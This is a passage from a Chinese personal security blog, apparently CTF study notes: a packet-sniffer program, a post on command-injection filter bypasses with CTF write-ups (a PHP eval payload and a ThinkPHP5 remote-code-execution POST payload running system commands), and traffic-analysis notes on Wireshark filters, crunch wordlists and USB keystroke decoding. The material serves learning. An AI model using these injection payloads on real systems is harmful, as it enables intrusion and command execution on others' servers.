class="line">    <span class="keyword">if</span> (sock == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cerr</span> &lt;&lt; WSAGetLastError();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取本机地址</span></span><br><span class="line">    <span class="keyword">char</span>  name[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">-1</span> == gethostname(name, <span class="keyword">sizeof</span>(name)))</span><br><span class="line">    &#123;</span><br><span class="line">        closesocket(sock);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; WSAGetLastError();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span>* <span class="title">pHostent</span>;</span></span><br><span class="line">    pHostent = gethostbyname(name);</span><br><span class="line">    <span class="comment">//绑定本地地址到SOCKET</span></span><br><span class="line">    sockaddr_in addr;</span><br><span class="line">    addr.sin_family = AF_INET;</span><br><span class="line">    addr.sin_addr = *(in_addr*)pHostent-&gt;h_addr_list[<span class="number">0</span>]; <span class="comment">//IP</span></span><br><span class="line">    addr.sin_port = <span class="number">8888</span>; <span class="comment">//端口，IP层端口可随意填</span></span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == bind(sock, (sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)))</span><br><span class="line">    &#123;</span><br><span class="line">        closesocket(sock);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; WSAGetLastError();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//设置该SOCKET为接收所有流经绑定的IP的网卡的所有数据，包括接收和发送的数据包</span></span><br><span class="line">    u_long sioarg = <span class="number">1</span>;</span><br><span class="line">    DWORD wt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == WSAIoctl(sock, SIO_RCVALL, &amp;sioarg, <span class="keyword">sizeof</span>(sioarg), <span class="literal">NULL</span>, <span class="number">0</span>, &amp;wt, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        closesocket(sock);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; WSAGetLastError();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//我们只需要接收数据，因此设置为阻塞IO，使用最简单的IO模型</span></span><br><span class="line">    u_long bioarg = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == ioctlsocket(sock, FIONBIO, &amp;bioarg))</span><br><span class="line">    &#123;</span><br><span class="line">        closesocket(sock);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; WSAGetLastError();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//开始接收数据</span></span><br><span class="line">    <span class="comment">//因为前面已经设置为阻塞IO，recv在接收到数据前不会返回。</span></span><br><span class="line">    number = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">65535</span>];</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        len = recv(sock, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (len &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            DecodeIP(buf, len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (len &gt; <span class="number">0</span>);</span><br><span class="line">    closesocket(sock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后来尝试用Python的socket模块进行编程，但是socket在Windows环境下不时出现Winerror，windows下基于python的socket编程资料也比较少，很难以解决，最后转向Linux。我推测原因在于Windows下对于socket的操作函数已经传入的参数设置可能于Linux存在不同，因而产生报错。在虚拟机Ubuntu20.04的开发环境完成程序的编写以及界面的编写。</p>
<p>关于软件的代码见<a target="_blank" rel="noopener" href="https://github.com/gorgeousdays/Package-analyse。存在诸多bug，由于在windows环境下测试不了，在Ubuntu虚拟机下测试性能太差，很难对代码进行Debug。">https://github.com/gorgeousdays/Package-analyse。存在诸多bug，由于在windows环境下测试不了，在Ubuntu虚拟机下测试性能太差，很难对代码进行Debug。</a></p>
<p>目前问题：</p>
<ol>
<li>只能抓包一次，即需要对socket的创建进行控制。</li>
<li>关于过滤器的编写，实现对抓取到的报文的过滤操作</li>
<li>优化问题，实现对TCP首部的分析，实现对所有报文的抓取分析以及过滤。</li>
</ol>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/charlesblc/p/6235437.html">https://www.cnblogs.com/charlesblc/p/6235437.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/riacool/archive/2010/12/14/1905404.html">https://www.cnblogs.com/riacool/archive/2010/12/14/1905404.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yunya-cnblogs/p/13198409.html">https://www.cnblogs.com/yunya-cnblogs/p/13198409.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=r59LJARW8hU">https://www.youtube.com/watch?v=r59LJARW8hU</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.kissg.me">https://blog.kissg.me</a></p>
<p><a target="_blank" rel="noopener" href="https://realpython.com/python-sockets/">https://realpython.com/python-sockets/</a></p>
<p><a target="_blank" rel="noopener" href="http://www.steves-internet-guide.com/tcpip-ports-sockets/#comment-1821">http://www.steves-internet-guide.com/tcpip-ports-sockets/#comment-1821</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/01/2020%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/01/2020%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">2020总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-01-01 00:01:57 / 修改时间：00:04:28" itemprop="dateCreated datePublished" datetime="2021-01-01T00:01:57+08:00">2021-01-01</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%97%B6%E9%97%B4%E7%9A%84%E6%9C%8B%E5%8F%8B/" itemprop="url" rel="index"><span itemprop="name">时间的朋友</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          Welcome to my blog, enter password to read.
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2021/01/01/2020%E6%80%BB%E7%BB%93/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/12/06/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/12/06/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">命令执行漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-12-06 17:20:35" itemprop="dateCreated datePublished" datetime="2020-12-06T17:20:35+08:00">2020-12-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-01-05 16:47:03" itemprop="dateModified" datetime="2021-01-05T16:47:03+08:00">2021-01-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%9D%82%E8%B0%88/" itemprop="url" rel="index"><span itemprop="name">杂谈</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="命令执行基础"><a href="#命令执行基础" class="headerlink" title="命令执行基础"></a>命令执行基础</h4><p>cmd与bash的一些规则</p>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>Windows</th>
<th>Linux</th>
</tr>
</thead>
<tbody>
<tr>
<td>转义字符</td>
<td>^</td>
<td>\</td>
</tr>
<tr>
<td>多条命令执行</td>
<td>&amp;&amp;、%0a</td>
<td>&amp;&amp;、；、$()、``、%0a、%0d</td>
</tr>
<tr>
<td>注释符号</td>
<td>：：</td>
<td>#</td>
</tr>
</tbody>
</table>
</div>
<p>除此之外，再Windows和Linux环境下还可以通过||来进行多条命令的执行，但是&amp;&amp;与||存在惰性原则，and一个不成立就不执行第二个，or若第一个成立也不执行第二个</p>
<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><h5 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h5><p>有时题目对过滤掉空格，于是我们可以采用以下方法来构造</p>
<ol>
<li>用<code>%00-%ff</code>区间的字符串测试，如<code>%09</code></li>
<li>在windows下通过<code>%ProgramFiles:~10,1%</code>获取空格<br><code>~</code>为截取符<code>%ProgramFile%</code>一般为<code>C:Program Files</code>截取从第十个字符开始的一个字符，即为空格</li>
<li>Linux下<ul>
<li><code>$IFS$9</code></li>
<li><code>&#123;cmd,args&#125;</code>  对<code>bash</code>有效，对<code>zsh、dash</code>无效</li>
<li><code>cat&lt;&gt;flag</code>  读取文件时</li>
<li>e.g.<code>echo$IF$9aaaa</code>    <code>&#123;echo,aaaa&#125;</code></li>
</ul>
</li>
</ol>
<h5 id="黑名单关键字"><a href="#黑名单关键字" class="headerlink" title="黑名单关键字"></a>黑名单关键字</h5><p>有时题目对过滤掉<code>cat flag</code>等关键字，于是我们可以采用以下方法来构造</p>
<ol>
<li><p><strong>变量拼接</strong>  <code>Linux:a=c;b=at;c=he;d=llo;$a$b $&#123;c&#125;$&#123;d&#125;</code><br>给变量重新赋值 拼接后为<code>cat flag</code></p>
</li>
<li><p><strong>使用通配符</strong>  <code>Linux:cat /tm?/fl*</code>    <code>Windows:type fla*</code><br>?代表任意一个字符串，*则代表任意个字符创</p>
</li>
<li><p><strong>借用已有字符串</strong> 如果禁用<code>&lt;&gt;?</code>等字符串，则可以借用其他文件中的字符串，利用<code>substr()</code>函数来截取某个特定字符串。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:cat test.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> test.php;</span><br><span class="line">?&gt;</span><br><span class="line">root@kali:<span class="built_in">echo</span> `expr substr $(awk NR==1 test.php) 1 1`</span><br><span class="line">&lt;</span><br><span class="line">root@kali:<span class="built_in">echo</span> `expr substr $(awk NR==3 test.php) 2 1`</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h5 id="执行无回显"><a href="#执行无回显" class="headerlink" title="执行无回显"></a>执行无回显</h5><ol>
<li>HTTP通道</li>
<li>DNS通道</li>
<li>时间盲注</li>
<li>写入文件，二次返回</li>
</ol>
<h4 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h4><h5 id="GitHack"><a href="#GitHack" class="headerlink" title="GitHack"></a><a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">GitHack</a></h5><p>存在git泄露 扫码网站得到index.php</p>
<h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>先传入参数<code>exp</code>，第一个和第三个if过滤掉了协议以及关键词</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;]))</span><br></pre></td></tr></table></figure>
<p>第二个if表明所给的<code>exp</code>在去掉字母括号后为<code>;</code></p>
<h5 id="构造"><a href="#构造" class="headerlink" title="构造."></a>构造<code>.</code></h5><p>源码在<code>flag.php</code>中</p>
<p>我们可以通过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(scandir(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>来扫码当前目录下的文件，但是<code>.</code>符号已经被过滤</p>
<p>于是我们可以构造<code>.</code>号，有以下两种方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure>
<p>从而获取到了5个文件，<code>flag.php</code>为数组的倒数第二个元素</p>
<h5 id="获取falg-php"><a href="#获取falg-php" class="headerlink" title="获取falg.php"></a>获取falg.php</h5><p>为了获取倒数第二个元素，我们可以通过<code>array_rand(array_filp())</code>随机从数组中取值。其中<code>array_flip()</code>交换数组的键和值，<code>array_rand()</code>从数组中随机取出一个或多个单元。</p>
<p>构造<code>payload</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<p>由于是随机取值，多刷新几遍网页就可以得到flag</p>
<h4 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h4><p>发现网页由THINKPHP5驱动，发现其存在<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3845">漏洞</a>,即可通过Post操作传入下列参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;</span><br></pre></td></tr></table></figure>
<p>这是应对漏洞的一种格式固定的操作。有以上两种方法。等号后面跟的是命令。</p>
<p>先传参查看目录结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls</span><br></pre></td></tr></table></figure>
<p>后获取flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">流量分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-11-29 21:34:01 / 修改时间：21:34:48" itemprop="dateCreated datePublished" datetime="2020-11-29T21:34:01+08:00">2020-11-29</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%9D%82%E8%B0%88/" itemprop="url" rel="index"><span itemprop="name">杂谈</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="Wireshark常用过滤指令"><a href="#Wireshark常用过滤指令" class="headerlink" title="Wireshark常用过滤指令"></a>Wireshark常用过滤指令</h4><p>过滤IP：<code>ip.src eq x.x.x.x or ip.dst eq x.x.x.x</code></p>
<p>•过滤端口：<code>tcp.port eq 80 or udp.port eq 80</code></p>
<p>•过滤协议：<code>tcp/udp/http/tls/ssl/icmp/ftp/dns/ip</code></p>
<p>•http过滤模式：</p>
<p>​     •<code>http.request.method == “GET”</code></p>
<p>​     •<code>http.request.method == “POST”</code></p>
<p>​     •<code>http.request.uri == “[路由地址]”</code></p>
<p>​     •<code>[协议] contains “[关键字]”</code></p>
<h4 id="Crunch"><a href="#Crunch" class="headerlink" title="Crunch"></a>Crunch</h4><p>Crunch是一种创建密码字典工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Usage: crunch [options]</span><br><span class="line"></span><br><span class="line">crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]</span><br><span class="line"></span><br><span class="line"> min-len  设定最小字符串长度</span><br><span class="line"> max-len  设定最大字符串长度</span><br><span class="line"> </span><br><span class="line"> options</span><br><span class="line"> -o password.txt 指定输出文件的名称，例如password.txt</span><br><span class="line"></span><br><span class="line">-t 命令</span><br><span class="line"></span><br><span class="line">-t @,%^ 指定模式，</span><br><span class="line"></span><br><span class="line">@ 插入小写字母</span><br><span class="line">, 插入大写字母</span><br><span class="line">% 插入数字</span><br><span class="line">^ 插入特殊符号</span><br></pre></td></tr></table></figure>
<p>Crunch命令详解 以及使用方法</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42025840/article/details/81125584">https://blog.csdn.net/qq_42025840/article/details/81125584</a></p>
<h4 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h4><p>在kali下提取得到 <code>usbdata.txt</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark   -r usb2.pcap  -T fields -e usb.capdata  &gt;  usbdata.txt</span><br></pre></td></tr></table></figure>
<p>然后将16进制的<code>usbdata.txt</code>转化为坐标</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python  usb.py  &gt;  xy.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#usb.py</span></span><br><span class="line">nums = []</span><br><span class="line">keys = open(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> len(line) != <span class="number">12</span> :</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    x = int(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line">    y = int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">        x -= <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> y &gt; <span class="number">127</span> :</span><br><span class="line">        y -= <span class="number">256</span></span><br><span class="line">    posx += x</span><br><span class="line">    posy += y</span><br><span class="line">    btn_flag = int(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>) </span><br><span class="line">    <span class="keyword">if</span> btn_flag == <span class="number">2</span> :                     <span class="comment"># 1 for left , 2 for right , 0 for nothing</span></span><br><span class="line">        <span class="keyword">print</span> posx , posy</span><br><span class="line">keys.close()</span><br></pre></td></tr></table></figure>
<p>进入gnuplot工具，将xy.txt中的坐标转图片</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gnuplot                   &#x2F;&#x2F;进入gunplot工具</span><br><span class="line">plot  &quot;xy.txt&quot;            &#x2F;&#x2F;把xy.txt文本里的坐标转化为图片</span><br></pre></td></tr></table></figure>
<h4 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>在kali下提取得到<code>usbdata.txt</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure>
<p>对生成<code>flag.txt</code>去空行后执行下面脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span 